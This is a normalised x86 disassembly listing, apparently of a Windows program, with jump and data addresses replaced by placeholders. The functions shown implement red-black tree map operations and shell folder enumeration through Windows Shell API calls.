test dl dl
jne r-xdata
mov eax [ edx + 0x8 ]
mov bl [ eax + 0x11 ]
test bl bl
jne r-xdata
pop ebx
retn
lea ecx [ ecx ]
mov [ ecx ] edx
pop ebx
retn
mov edx eax
mov eax [ edx + 0x8 ]
mov bl [ eax + 0x11 ]
test bl bl
je r-xdata
mov dl [ eax + 0x11 ]
test dl dl
jne r-xdata
mov [ ecx ] eax
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x11 ]
test dl dl
je r-xdata
mov [ ecx ] eax
mov edx [ ecx ]
cmp edx [ eax ]
jne r-xdata
sub_42e2d0
mov eax [ ecx ]
mov dl [ eax + 0x11 ]
test dl dl
jne r-xdata
retn
mov edx [ eax + 0x8 ]
push ebx
mov bl [ edx + 0x11 ]
test bl bl
jne r-xdata
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x11 ]
test dl dl
jne r-xdata
mov eax [ edx ]
mov bl [ eax + 0x11 ]
test bl bl
jne r-xdata
mov [ ecx ] eax
pop ebx
lea esp [ esp ]
mov [ ecx ] edx
pop ebx
retn
lea ecx [ ecx ]
mov [ ecx ] eax
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x11 ]
test dl dl
je r-xdata
mov edx eax
mov eax [ edx ]
mov bl [ eax + 0x11 ]
test bl bl
je r-xdata
mov edx [ ecx ]
cmp edx [ eax + 0x8 ]
jne r-xdata
sub_42e330
sub esp 0x20c
push esi
push edi
push 0x0
call sub_42dd20
mov esi eax
add esp 0x4
test esi esi
je r-xdata
pop edi
xor eax eax
pop esi
add esp 0x20c
retn
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ eax + 0x18 ] 0x10
jb r-xdata
lea edx [ esp + 0x8 ]
push edx
xor edi edi
call [ SHGetMalloc@IAT ]
test eax eax
jl r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov eax [ esi + 0xc ]
mov ecx [ esp + 0x8 ]
push eax
push ecx
call sub_444170
mov esi eax
add esp 0x8
test esi esi
je r-xdata
push eax
lea eax [ esp + 0x10 ]
push eax
call [ lstrcpyA@IAT ]
lea ecx [ esp + 0xc ]
push ecx
call sub_457f40
add esp 0x4
push eax
lea edx [ esp + 0x10 ]
push edx
lea eax [ esp + 0x118 ]
push eax
call [ lstrcpynA@IAT ]
lea ecx [ esp + 0x110 ]
push 0x0
push ecx
call sub_42dee0
add esp 0x8
pop edi
pop esi
add esp 0x20c
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax edi
pop edi
pop esi
add esp 0x20c
retn
push edi
push esi
call sub_42dd30
add esp 0x8
mov edi eax
mov eax [ esp + 0x8 ]
mov edx [ eax ]
push esi
push eax
call [ edx + 0x14 ]
sub_42e410
push 0x14
call sub_4b573e
add esp 0x4
test eax eax
je r-xdata
retn 0x14
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] ecx
mov ecx [ esp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx [ esp + 0x10 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx ]
mov dl [ esp + 0x14 ]
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] dl
mov [ eax + 0x11 ] 0x0
sub_42e450
push 0x14
call sub_4b573e
add esp 0x4
test eax eax
je r-xdata
lea ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov [ eax ] 0x0
lea ecx [ eax + 0x8 ]
test ecx ecx
je r-xdata
mov [ ecx ] 0x0
mov [ eax + 0x10 ] 0x1
mov [ eax + 0x11 ] 0x0
retn
mov [ ecx ] 0x0
sub_42e490
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
mov al [ edi + 0x11 ]
test al al
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x4
mov eax [ esi + 0x8 ]
push eax
mov ecx ebx
call sub_42e490
mov esi [ esi ]
push edi
call j_sub_4b66ed#2
mov al [ esi + 0x11 ]
add esp 0x4
test al al
mov edi esi
je r-xdata
sub_42e4d0
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
push esi
mov esi [ rw-data ]
cmp esi rw-data
jne r-xdata
push 0x0
call [ MessageBeep@IAT ]
xor eax eax
retn
dec ecx
mov eax ecx
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea edx [ eax * 4 ]
mov [ rw-data ] ecx
sub ecx edx
mov [ rw-data ] 0x1
mov edx [ esi + 0x8 ]
cmp edx eax
ja r-xdata
cmp ecx [ rw-data ]
jne r-xdata
mov edx [ esi + 0x4 ]
mov eax [ edx + eax * 4 ]
mov ecx [ eax + ecx * 4 ]
push 0x0
push ecx
call sub_42dd30
add esp 0x8
mov [ rw-data ] 0x0
mov eax 0x1
pop esi
retn
sub eax edx
push 0x0
call [ MessageBeep@IAT ]
xor eax eax
pop esi
retn
sub_42e560
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
push esi
mov esi [ rw-data ]
inc ecx
add eax edx
cmp esi rw-data
mov [ rw-data ] ecx
jne r-xdata
push eax
call [ MessageBeep@IAT ]
xor eax eax
retn
mov eax ecx
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea edx [ eax * 4 ]
sub ecx edx
mov [ rw-data ] 0x1
mov edx [ esi + 0x8 ]
cmp edx eax
ja r-xdata
cmp ecx eax
jne r-xdata
mov edx [ esi + 0x4 ]
mov eax [ edx + eax * 4 ]
mov ecx [ eax + ecx * 4 ]
push 0x0
push ecx
call sub_42dd30
add esp 0x8
mov [ rw-data ] 0x0
mov eax 0x1
pop esi
retn
sub eax edx
push 0x0
call [ MessageBeep@IAT ]
dec [ rw-data ]
xor eax eax
pop esi
retn
sub_42e600
push ecx
lea eax [ esp ]
push eax
call [ SHGetMalloc@IAT ]
test eax eax
jge r-xdata
mov eax [ esp ]
mov ecx [ eax ]
push esi
push edi
push 0x20
push eax
call [ ecx + 0xc ]
mov esi eax
mov eax [ esp + 0x8 ]
mov edx [ eax ]
push eax
call [ edx + 0x8 ]
xor eax eax
mov ecx 0x8
mov edi esi
[ edi ]
mov ecx rw-data
call sub_460310
mov eax [ rw-data ]
mov [ rw-data ] eax
dec eax
mov ecx rw-data
mov [ rw-data ] eax
pop edi
mov eax esi
mov [ rw-data ] ecx
mov [ rw-data ] 0x0
pop esi
pop ecx
retn
xor eax eax
pop ecx
retn
sub_42e670
push ecx
push esi
mov esi eax
lea eax [ esp + 0x4 ]
push eax
call [ SHGetMalloc@IAT ]
test eax eax
jl r-xdata
pop esi
pop ecx
retn
test esi esi
je r-xdata
mov esi [ rw-data ]
push ebx
mov ebx [ rw-data ]
push ebp
push edi
mov edi [ rw-data ]
jmp r-xdata
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
push esi
push eax
call [ ecx + 0x14 ]
mov edx [ rw-data ]
mov eax [ rw-data ]
add eax edx
cmp esi eax
je r-xdata
mov ecx rw-data
call sub_460310
mov eax [ esp + 0x10 ]
mov edx [ eax ]
push eax
call [ edx + 0x8 ]
pop edi
pop ebp
pop ebx
mov eax esi
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov ecx eax
lea edx [ ecx * 4 ]
mov ebp edx
mov edx esi
sub edx ebp
cmp edi ecx
ja r-xdata
mov ecx [ ebx + ecx * 4 ]
cmp [ ecx + edx * 4 ] 0x0
je r-xdata
sub ecx edi
inc esi
jmp r-xdata
lea edx [ eax * 4 ]
mov ecx esi
sub ecx edx
cmp edi eax
ja r-xdata
mov eax [ ebx + eax * 4 ]
mov ecx [ eax + ecx * 4 ]
mov edx [ esp + 0x10 ]
mov edi [ edx ]
push ecx
push edx
call [ edi + 0x14 ]
mov ebx [ rw-data ]
mov edi [ rw-data ]
sub eax edi
sub_42e740
push esi
call sub_42e600
mov esi eax
test esi esi
jne r-xdata
push ebx
mov ebx [ esp + 0xc ]
push ebp
push edi
lea ebp [ esi + 0x8 ]
push ebp
push ebx
call sub_430ca0
add esp 0x8
test eax eax
mov [ esi ] eax
je r-xdata
pop esi
retn
mov eax esi
call sub_42e670
pop edi
pop ebp
pop ebx
xor eax eax
pop esi
retn
mov edi [ esp + 0x18 ]
mov [ edi ] eax
push eax
mov eax esi
call sub_42dd10
lea eax [ esi + 0x18 ]
push eax
add ebx 0x2c
push ebx
call sub_432ba0
add esp 0xc
test eax eax
mov [ esi + 0x4 ] eax
jne r-xdata
mov [ edi + 0x4 ] eax
push eax
mov eax esi
call sub_42dd10
add esp 0x4
pop edi
pop ebp
pop ebx
mov eax 0x1
pop esi
retn
mov ecx [ edi ]
push ebp
push ecx
call sub_430c80
add esp 0x8
sub_42e7c0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4bfe88
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
push esi
push edi
mov edi ecx
cmp [ edi + 0x14 ] 0x3ffffffe
jb r-xdata
mov edx [ esp + 0x68 ]
mov eax [ edi + 0x10 ]
mov esi [ esp + 0x64 ]
push ebx
push 0x0
push edx
push eax
push esi
push eax
mov ecx edi
call sub_42e410
mov ebx [ edi + 0x14 ]
mov ecx eax
mov eax [ edi + 0x10 ]
inc ebx
cmp esi eax
mov [ esp + 0x6c ] ecx
mov [ edi + 0x14 ] ebx
jne r-xdata
xor esi esi
mov eax r--data
mov [ esp + 0x20 ] 0xf
mov [ esp + 0x1c ] esi
mov [ esp + 0xc ] 0x0
lea edx [ eax + 0x1 ]
mov al [ esp + 0x64 ]
test al al
je r-xdata
mov [ eax + 0x4 ] ecx
mov eax [ edi + 0x10 ]
mov [ eax ] ecx
mov edx [ edi + 0x10 ]
mov [ edx + 0x8 ] ecx
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x10 ]
call sub_401e80
lea eax [ esp + 0x8 ]
push eax
lea ecx [ esp + 0x28 ]
mov [ esp + 0x58 ] esi
call sub_402340
push r--data
lea ecx [ esp + 0x28 ]
push ecx
mov [ esp + 0x2c ] r--data
call sub_4b5bd2
mov [ esi + 0x8 ] ecx
mov eax [ edi + 0x10 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov [ esi ] ecx
mov eax [ edi + 0x10 ]
cmp esi [ eax ]
jne r-xdata
mov edx [ ecx + 0x4 ]
cmp [ edx + 0x10 ] 0x0
lea eax [ ecx + 0x4 ]
mov esi ecx
mov bl 0x1
jne r-xdata
mov [ eax + 0x8 ] ecx
mov [ eax ] ecx
jmp r-xdata
mov edx [ edi + 0x10 ]
mov eax [ edx + 0x4 ]
mov [ eax + 0x10 ] bl
mov eax [ esp + 0x60 ]
pop ebx
mov [ eax ] ecx
mov ecx [ esp + 0x4c ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x50
retn 0x10
push ebp
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
cmp esi [ ecx ]
jne r-xdata
mov [ ecx + 0x10 ] bl
mov [ edx + 0x10 ] bl
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov [ edx + 0x10 ] 0x0
mov eax [ eax ]
mov esi [ eax + 0x4 ]
jmp r-xdata
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov [ ecx + 0x10 ] bl
mov [ edx + 0x10 ] bl
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov [ edx + 0x10 ] 0x0
mov eax [ eax ]
mov esi [ eax + 0x4 ]
jmp r-xdata
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x10 ] bl
mov edx [ esi + 0x4 ]
mov eax [ edx + 0x4 ]
mov [ eax + 0x10 ] 0x0
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x4 ]
push edx
mov ecx edi
call sub_42e1b0
mov esi ecx
push esi
mov ecx edi
call sub_42e210
mov ecx [ esi + 0x4 ]
mov dl [ ecx + 0x10 ]
test dl dl
lea eax [ esi + 0x4 ]
je r-xdata
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x10 ] bl
mov edx [ esi + 0x4 ]
mov eax [ edx + 0x4 ]
mov [ eax + 0x10 ] 0x0
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x4 ]
push edx
mov ecx edi
call sub_42e210
jmp r-xdata
mov esi ecx
push esi
mov ecx edi
call sub_42e1b0
mov ecx [ eax ]
mov ebp [ ecx + 0x4 ]
mov edx [ ebp ]
cmp ecx edx
jne r-xdata
mov ecx [ esp + 0x70 ]
pop ebp
sub_42e9a0
push 0xffffffff
push sub_4bfe88
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x4c
push esi
push edi
mov edi [ esp + 0x68 ]
mov al [ edi + 0x11 ]
test al al
mov [ esp + 0x8 ] ecx
je r-xdata
push ebx
mov ebx edi
push ebp
lea ecx [ esp + 0x70 ]
mov [ esp + 0x14 ] ebx
call sub_42e2d0
mov ebp [ edi ]
mov al [ ebp + 0x11 ]
test al al
lea eax [ edi + 0x8 ]
jne r-xdata
xor esi esi
mov eax r--data
mov [ esp + 0x28 ] 0xf
mov [ esp + 0x24 ] esi
mov [ esp + 0x14 ] 0x0
lea edx [ eax + 0x1 ]
mov ebp [ eax ]
mov edx [ eax ]
mov cl [ edx + 0x11 ]
test cl cl
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x18 ]
call sub_401e80
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x30 ]
mov [ esp + 0x60 ] esi
call sub_402340
push r--data
lea ecx [ esp + 0x30 ]
push ecx
mov [ esp + 0x34 ] r--data
call sub_4b5bd2
mov ecx [ ebx ]
mov [ ecx + 0x4 ] edi
mov edx [ ebx ]
mov [ edi ] edx
cmp edi [ ebx + 0x8 ]
jne r-xdata
mov al [ ebp + 0x11 ]
test al al
mov esi [ ebx + 0x4 ]
jne r-xdata
cmp edi ebx
jne r-xdata
mov eax [ esp + 0x70 ]
mov edi eax
add eax 0x8
mov cl [ ebp + 0x11 ]
test cl cl
mov esi [ edi + 0x4 ]
jne r-xdata
mov esi edi
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ ecx + 0x10 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ ebp + 0x4 ] esi
mov [ esi ] ebp
mov ecx [ ebx + 0x8 ]
mov [ eax ] ecx
mov edx [ ebx + 0x8 ]
mov [ edx + 0x4 ] edi
mov [ ebp + 0x4 ] esi
mov eax [ esp + 0x10 ]
mov eax [ eax + 0x10 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
cmp [ esi ] ebx
jne r-xdata
mov [ eax + 0x4 ] ebp
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi + 0x8 ] ebp
mov [ esi ] ebp
jmp r-xdata
mov edi [ ecx + 0x10 ]
cmp [ edi ] ebx
jne r-xdata
mov [ eax + 0x8 ] edi
mov [ eax ] edi
jmp r-xdata
mov ecx [ ebx + 0x4 ]
mov [ edi + 0x4 ] ecx
mov dl [ ebx + 0x10 ]
mov al [ edi + 0x10 ]
mov [ edi + 0x10 ] dl
mov [ ebx + 0x10 ] al
mov edi [ ecx + 0x10 ]
cmp [ edi + 0x8 ] ebx
jne r-xdata
mov al [ ebp + 0x11 ]
test al al
je r-xdata
mov eax [ esp + 0x14 ]
push eax
call j_sub_4b66ed#2
mov eax [ edi + 0x14 ]
add esp 0x4
test eax eax
pop ebp
pop ebx
jbe r-xdata
mov ecx [ edi + 0x10 ]
cmp ebp [ ecx + 0x4 ]
je r-xdata
mov eax [ esp + 0x14 ]
mov cl [ eax + 0x10 ]
mov edi [ esp + 0x10 ]
mov bl 0x1
cmp cl bl
jne r-xdata
mov al [ ebp + 0x11 ]
test al al
je r-xdata
push ebp
call sub_42e130
mov ecx [ esp + 0x14 ]
add esp 0x4
mov eax esi
jmp r-xdata
mov ecx [ esp + 0x68 ]
mov eax [ esp + 0x64 ]
mov [ eax ] ecx
mov ecx [ esp + 0x54 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x58
retn 0x8
dec eax
mov [ edi + 0x14 ] eax
mov [ ebp + 0x10 ] bl
cmp [ ebp + 0x10 ] bl
jne r-xdata
push ebp
call sub_42e110
add esp 0x4
mov [ edi + 0x8 ] eax
jmp r-xdata
mov eax esi
mov [ edi + 0x8 ] eax
jmp r-xdata
mov [ edi ] eax
mov eax [ esi ]
cmp ebp eax
jne r-xdata
mov cl [ eax + 0x10 ]
test cl cl
jne r-xdata
mov eax [ esi + 0x8 ]
mov cl [ eax + 0x10 ]
test cl cl
jne r-xdata
mov cl [ eax + 0x11 ]
test cl cl
jne r-xdata
mov [ eax + 0x10 ] bl
push esi
mov ecx edi
mov [ esi + 0x10 ] 0x0
call sub_42e210
mov eax [ esi ]
mov cl [ eax + 0x11 ]
test cl cl
jne r-xdata
mov [ eax + 0x10 ] bl
push esi
mov ecx edi
mov [ esi + 0x10 ] 0x0
call sub_42e1b0
mov eax [ esi + 0x8 ]
mov edx [ edi + 0x10 ]
mov eax [ edx + 0x4 ]
mov ebp esi
cmp ebp eax
mov esi [ esi + 0x4 ]
jne r-xdata
mov edx [ eax + 0x8 ]
cmp [ edx + 0x10 ] bl
jne r-xdata
mov edx [ eax ]
cmp [ edx + 0x10 ] bl
jne r-xdata
jmp r-xdata
mov ecx [ eax ]
cmp [ ecx + 0x10 ] bl
jne r-xdata
mov ecx [ eax ]
cmp [ ecx + 0x10 ] bl
jne r-xdata
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x10 ] bl
jne r-xdata
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x10 ] bl
je r-xdata
mov cl [ esi + 0x10 ]
mov [ eax + 0x10 ] cl
mov [ esi + 0x10 ] bl
mov edx [ eax ]
push esi
mov ecx edi
mov [ edx + 0x10 ] bl
call sub_42e210
mov edx [ eax + 0x8 ]
mov [ edx + 0x10 ] bl
push eax
mov ecx edi
mov [ eax + 0x10 ] 0x0
call sub_42e1b0
mov eax [ esi ]
mov [ eax + 0x10 ] 0x0
mov cl [ esi + 0x10 ]
mov [ eax + 0x10 ] cl
mov [ esi + 0x10 ] bl
mov edx [ eax + 0x8 ]
push esi
mov ecx edi
mov [ edx + 0x10 ] bl
call sub_42e1b0
jmp r-xdata
mov edx [ eax ]
mov [ edx + 0x10 ] bl
push eax
mov ecx edi
mov [ eax + 0x10 ] 0x0
call sub_42e210
mov eax [ esi + 0x8 ]
sub_42ec70
push ecx
push ebx
mov ebx [ esp + 0x10 ]
push ebp
push esi
push edi
mov edi ecx
mov eax [ edi + 0x10 ]
mov esi [ eax + 0x4 ]
mov cl [ esi + 0x11 ]
test cl cl
mov ebp eax
mov al 0x1
mov [ esp + 0x10 ] al
jne r-xdata
test al al
mov esi ebp
mov [ esp + 0x1c ] esi
je r-xdata
mov edx [ esi + 0xc ]
mov eax [ edi ]
mov ecx [ eax ]
push edx
mov edx [ ebx ]
push edx
push 0x0
push eax
mov ebp esi
call [ ecx + 0x1c ]
test eax eax
jge r-xdata
mov edx [ ebx ]
mov eax [ edi ]
mov ecx [ eax ]
push edx
mov edx [ esi + 0xc ]
push edx
push 0x0
push eax
call [ ecx + 0x1c ]
test eax eax
jl r-xdata
mov eax [ edi + 0x10 ]
cmp ebp [ eax ]
lea ecx [ esp + 0x1c ]
jne r-xdata
test ax ax
jge r-xdata
mov esi [ esi + 0x8 ]
xor al al
mov [ esp + 0x10 ] al
mov eax [ esp + 0x18 ]
pop edi
mov [ eax ] esi
pop esi
pop ebp
mov [ eax + 0x4 ] 0x0
pop ebx
pop ecx
retn 0x8
test ax ax
jge r-xdata
call sub_42e270
mov esi [ esp + 0x1c ]
push ebx
push ebp
push 0x1
push ecx
mov ecx edi
call sub_42e7c0
mov edx [ eax ]
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
mov [ eax ] edx
mov [ eax + 0x4 ] 0x1
pop ebx
pop ecx
retn 0x8
mov esi [ esi ]
mov al 0x1
mov [ esp + 0x10 ] al
jmp r-xdata
mov eax [ esp + 0x10 ]
push ebx
push ebp
push eax
lea ecx [ esp + 0x28 ]
push ecx
mov ecx edi
call sub_42e7c0
mov edx [ eax ]
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
mov [ eax ] edx
mov [ eax + 0x4 ] 0x1
pop ebx
pop ecx
retn 0x8
mov cl [ esi + 0x11 ]
test cl cl
je r-xdata
sub_42ed60
push ebx
mov ebx [ esp + 0x10 ]
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi ecx
mov eax [ edi + 0x10 ]
cmp esi [ eax ]
jne r-xdata
cmp esi ebx
je r-xdata
cmp ebx eax
jne r-xdata
mov eax [ esp + 0x10 ]
pop edi
mov [ eax ] esi
pop esi
pop ebx
retn 0xc
mov al [ esi + 0x11 ]
test al al
mov ecx esi
jne r-xdata
mov eax [ eax + 0x4 ]
push eax
mov ecx edi
call sub_42e490
mov eax [ edi + 0x10 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x10 ]
mov [ edi + 0x14 ] 0x0
mov [ eax ] eax
mov eax [ edi + 0x10 ]
mov [ eax + 0x8 ] eax
mov ecx [ edi + 0x10 ]
mov edx [ ecx ]
mov eax [ esp + 0x10 ]
pop edi
pop esi
mov [ eax ] edx
pop ebx
retn 0xc
push ecx
lea eax [ esp + 0x18 ]
push eax
mov ecx edi
call sub_42e9a0
cmp esi ebx
jne r-xdata
mov eax [ esi + 0x8 ]
mov dl [ eax + 0x11 ]
test dl dl
jne r-xdata
mov eax [ esi + 0x4 ]
mov dl [ eax + 0x11 ]
test dl dl
jne r-xdata
mov esi eax
mov eax [ esi ]
mov dl [ eax + 0x11 ]
test dl dl
jne r-xdata
mov esi eax
cmp esi [ eax + 0x8 ]
jne r-xdata
mov edi edi
mov esi eax
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x11 ]
test dl dl
je r-xdata
mov esi eax
mov eax [ esi ]
mov dl [ eax + 0x11 ]
test dl dl
je r-xdata
jmp r-xdata
sub_42ee20
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_42ed60
mov ecx [ esi + 0x10 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
xor eax eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
pop esi
pop ecx
retn
sub_42ee50
push ecx
mov eax [ esp ]
push esi
mov esi ecx
mov [ esi ] eax
call sub_42e450
mov [ esi + 0x10 ] eax
mov [ eax + 0x11 ] 0x1
mov eax [ esi + 0x10 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x10 ]
mov [ eax ] eax
mov eax [ esi + 0x10 ]
mov [ eax + 0x8 ] eax
mov [ esi + 0x14 ] 0x0
mov eax esi
pop esi
pop ecx
retn
sub_42ee90
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4bfeb6
push eax
mov [ fs : 0x0 ] esp
sub esp 0x3bc
push ebx
push esi
lea eax [ esp + 0x8 ]
push eax
xor ebx ebx
xor esi esi
call [ SHGetMalloc@IAT ]
test eax eax
jl r-xdata
mov ecx [ esp + 0x3c4 ]
mov eax esi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x3c8
retn
lea ecx [ esp + 0x14 ]
push ecx
call [ SHGetDesktopFolder@IAT ]
test eax eax
jl r-xdata
mov eax [ esp + 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ esp + 0x3d4 ]
push 0x104
lea edx [ esp + 0x1c0 ]
push edx
push 0xffffffff
push eax
push 0x1
push ebx
call [ MultiByteToWideChar@IAT ]
mov eax [ esp + 0x14 ]
mov ecx [ eax ]
lea edx [ esp + 0x44 ]
push edx
lea edx [ esp + 0x14 ]
push edx
lea edx [ esp + 0x48 ]
push edx
lea edx [ esp + 0x1c8 ]
push edx
push ebx
push ebx
push eax
call [ ecx + 0xc ]
test eax eax
jl r-xdata
mov eax [ esp + 0x14 ]
mov edx [ eax ]
push eax
call [ edx + 0x8 ]
mov eax [ esp + 0x14 ]
mov ecx [ eax ]
lea edx [ esp + 0x18 ]
push edx
mov edx [ esp + 0x14 ]
push r--data
push ebx
push edx
push eax
call [ ecx + 0x14 ]
test eax eax
jl r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
mov edx [ eax ]
push ecx
push eax
call [ edx + 0x14 ]
lea ecx [ esp + 0x28 ]
call sub_42ee50
mov eax [ esp + 0x18 ]
lea edx [ esp + 0xc ]
push edx
push 0x60
push ebx
mov [ esp + 0x34 ] eax
mov ecx [ eax ]
push eax
mov [ esp + 0x3dc ] ebx
call [ ecx + 0x10 ]
test eax eax
jl r-xdata
mov eax [ esp + 0x18 ]
mov edx [ eax ]
push eax
call [ edx + 0x8 ]
mov eax [ esp + 0x38 ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ esp + 0x28 ]
push eax
lea ecx [ esp + 0x34 ]
mov [ esp + 0x3d8 ] 0xffffffff
call sub_42ed60
mov ecx [ esp + 0x38 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov [ esp + 0x38 ] ebx
mov [ esp + 0x3c ] ebx
mov eax [ esp + 0xc ]
mov ecx [ eax ]
push ebx
lea edx [ esp + 0x20 ]
push edx
push 0x1
push eax
call [ ecx + 0xc ]
test eax eax
jne r-xdata
mov eax [ esp + 0x38 ]
push edi
mov edi [ eax ]
cmp edi eax
mov [ esp + 0x24 ] edi
je r-xdata
jmp r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ eax ]
push eax
mov esi 0x1
call [ ecx + 0x8 ]
pop edi
push ebp
mov ebp [ esp + 0x3e0 ]
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0x24 ]
push ecx
lea ecx [ esp + 0x30 ]
call sub_42ec70
mov eax [ esp + 0xc ]
mov edx [ eax ]
push ebx
lea ecx [ esp + 0x20 ]
push ecx
push 0x1
push eax
call [ edx + 0xc ]
test eax eax
je r-xdata
mov edx [ edi + 0xc ]
mov eax [ esp + 0x10 ]
mov ecx [ eax ]
push edx
push eax
call [ ecx + 0x14 ]
lea ecx [ esp + 0x28 ]
call sub_42e2d0
mov edi [ esp + 0x28 ]
cmp edi [ esp + 0x40 ]
jne r-xdata
lea ecx [ esp + 0xc0 ]
push ecx
push esi
call [ SHGetPathFromIDListA@IAT ]
cmp eax 0x1
jne r-xdata
mov edx [ edi + 0xc ]
mov eax [ esp + 0x18 ]
push edx
push eax
call sub_444280
mov esi eax
add esp 0x8
cmp esi ebx
je r-xdata
pop ebp
mov eax [ esp + 0x10 ]
mov edx [ eax ]
push esi
push eax
call [ edx + 0x14 ]
mov eax 0xf
mov [ esp + 0x68 ] eax
mov [ esp + 0x64 ] ebx
mov [ esp + 0x54 ] bl
mov [ esp + 0xbc ] eax
mov [ esp + 0xb8 ] ebx
mov [ esp + 0xa8 ] bl
lea edx [ esp + 0xc0 ]
push edx
lea ecx [ esp + 0x54 ]
mov [ esp + 0x3d8 ] 0x1
call sub_402510
lea eax [ esp + 0xc0 ]
push eax
call [ GetFileAttributesA@IAT ]
lea ecx [ esp + 0x50 ]
push ecx
mov ecx ebp
mov [ esp + 0x70 ] eax
call sub_407bb0
lea ecx [ esp + 0x50 ]
mov [ esp + 0x3d4 ] bl
call sub_401a90
sub_42f130
push 0xffffffff
push sub_4bfef4
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x180
push ebx
push ebp
push esi
push edi
mov ebp [ esp + 0x1bc ]
mov eax [ ebp + 0x18 ]
xor esi esi
mov edi 0x10
push ecx
cmp eax edi
mov [ esp + 0x19c ] esi
mov edx esp
lea eax [ ebp + 0x4 ]
jb r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
mov [ ecx ] eax
lea eax [ esp + 0x3c ]
push eax
mov ecx ebp
call sub_401c60
cmp [ esp + 0x1b4 ] esi
je r-xdata
mov eax [ eax ]
mov ebx [ ebp + 0x14 ]
add ebx ecx
mov [ edx ] ebx
cmp [ ebp + 0x18 ] edi
push ecx
mov ecx esp
jb r-xdata
cmp [ esp + 0x1b8 ] 0x10
jb r-xdata
mov edi 0xf
mov [ esp + 0x30 ] edi
mov [ esp + 0x2c ] esi
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x50 ] edi
mov [ esp + 0x4c ] esi
mov [ esp + 0x3c ] 0x0
mov [ esp + 0x6c ] edi
mov [ esp + 0x68 ] esi
mov [ esp + 0x58 ] 0x0
mov eax [ rw-data ]
cmp eax esi
mov bl 0x3
mov [ esp + 0x198 ] bl
jle r-xdata
xor eax eax
mov eax [ esp + 0x1a4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
cmp [ esp + 0x1b8 ] 0x10
mov esi [ esp + 0x1a4 ]
mov [ esp + 0x13 ] 0x0
mov [ esp + 0x12 ] 0x0
jae r-xdata
mov esi [ rw-data ]
test esi esi
jl r-xdata
mov al [ esi ]
test al al
je r-xdata
lea esi [ esp + 0x1a4 ]
cmp esi eax
jge r-xdata
mov al [ esp + 0x1c0 ]
test al al
je r-xdata
mov ebx [ wsprintfA@IAT ]
mov ecx rw-data
call sub_4010f0
test eax eax
jne r-xdata
mov ecx [ rw-data ]
xor edi edi
cmp ecx edi
je r-xdata
